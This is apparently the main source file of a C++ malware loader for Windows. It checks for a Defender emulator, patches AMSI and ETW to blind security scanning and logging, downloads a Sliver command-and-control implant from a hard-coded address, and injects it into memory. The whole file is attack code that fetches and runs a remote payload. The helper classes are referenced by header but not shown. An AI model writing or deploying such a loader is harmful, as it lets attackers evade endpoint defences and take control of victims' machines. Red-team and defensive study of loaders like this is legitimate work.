#include "Bypass.h"
#include "Inject.h"
#include "Download.h"
#include "util.h"

int main() {
	DefenderEmulator();

	Bypass bypass;
	Inject injector;
	Download downloader;
	std::vector<char> payload;

	bypass.PatchAMSI();
	bypass.PatchETW();
	// Sliver bin.
	payload = downloader.DownloadFile("http://192.168.152.134/INNOVATIVE_LEADER.bin");

	injector.injection(payload);
}


